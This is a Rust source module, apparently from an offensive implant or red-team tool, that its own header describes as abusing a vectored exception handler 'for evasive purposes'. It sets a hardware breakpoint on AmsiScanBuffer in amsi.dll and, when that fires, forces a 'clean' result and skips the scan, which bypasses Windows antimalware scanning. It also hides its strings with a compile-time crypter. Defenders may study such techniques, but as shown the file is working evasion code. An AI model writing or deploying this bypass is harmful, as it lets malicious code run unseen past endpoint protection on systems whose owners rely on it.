//! This module contains the vectored exception handler when abusing it for evasive purposes

use std::ffi::c_void;

use shared_no_std::export_resolver;
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::{
    Foundation::{EXCEPTION_BREAKPOINT, EXCEPTION_SINGLE_STEP},
    System::Diagnostics::Debug::{
        CONTEXT_DEBUG_REGISTERS_AMD64, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
        EXCEPTION_POINTERS,
    },
};

pub(super) unsafe extern "system" fn veh_handler(p_ep: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_record = unsafe { *(*p_ep).ExceptionRecord };
    let ctx = unsafe { &mut *(*p_ep).ContextRecord };

    if exception_record.ExceptionCode == EXCEPTION_BREAKPOINT {
        if let Some(p_amsi_scan_buf) = addr_of_amsi_scan_buf() {
            // Set the address we wish to monitor for a hardware breakpoint
            ctx.Dr0 = p_amsi_scan_buf as *const c_void as u64;
            // Set the bit which says Dr0 is enabled locally
            ctx.Dr7 |= 1;
        }

        // Increase the instruction pointer by 1, so we effectively move to the next instruction after int3
        ctx.Rip += 1;
        // Set flags
        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS_AMD64;
        // clear dr6
        ctx.Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    } else if exception_record.ExceptionCode == EXCEPTION_SINGLE_STEP {
        // Gate the exception to make sure it was our entry which triggered
        // to prevent false positives (which will lead to UB in the process)
        if (ctx.Dr6 & 0x1) == 0 {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        // Is there any debate over which one is better...????
        const AMSI_RESULT_CLEAN: u64 = 0;
        const _AMSI_RESULT_NOT_DETECTED: u64 = 1;

        // fake a return value in rax
        ctx.Rax = AMSI_RESULT_CLEAN as u64;

        // get return addr from the stack
        let rsp = ctx.Rsp as *const u64;
        let return_address = unsafe { *rsp };
        // set it
        ctx.Rip = return_address;

        // simulate popping the ret from the stack
        ctx.Rsp += 8;

        // clear dr6
        ctx.Dr6 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // All other  cases
    EXCEPTION_CONTINUE_SEARCH
}

pub(super) fn addr_of_amsi_scan_buf() -> Option<*const c_void> {
    match export_resolver::resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
        Ok(a) => return Some(a),
        Err(_) => {
            use crate::utils::console::print_failed;
            print_failed(sc!("Failed to find function AmsiScanBuffer..", 0xde).unwrap());

            return None;
        }
    }
}
